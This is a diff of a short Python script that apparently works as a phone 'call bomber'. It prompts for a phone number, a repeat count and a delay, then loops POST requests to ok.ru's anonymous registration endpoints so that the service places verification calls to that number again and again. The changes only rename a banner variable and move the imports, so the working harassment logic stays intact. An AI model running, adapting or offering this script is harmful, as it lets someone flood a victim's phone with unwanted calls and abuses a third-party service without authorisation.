@@ -1,4 +1,4 @@
-a= """"
+ZME= """"
 
                                                                                                     
                                                                                                     
@@ -54,8 +54,9 @@ a= """"
 """
 
 
-
-
+import requests
+import time
+print(ZME)
 print("number to call")
 a = int(input())
 print("time?")
@@ -66,8 +67,6 @@ list=[a]
 for i in list:
   for j in range(p):
     ##call
-    import requests
-    import time
     s = requests.session()
     payload = {'st.r.phone': i}
     response =s.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = payload)
@@ -76,6 +75,5 @@ for i in list:
     payload2 = {'st.r.fieldAcceptCallUIButton': 'Call'}
     response =s.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI", data = payload2)
     print (response.status_code, response.reason, j)
-    print(a)
     time.sleep(k)
     
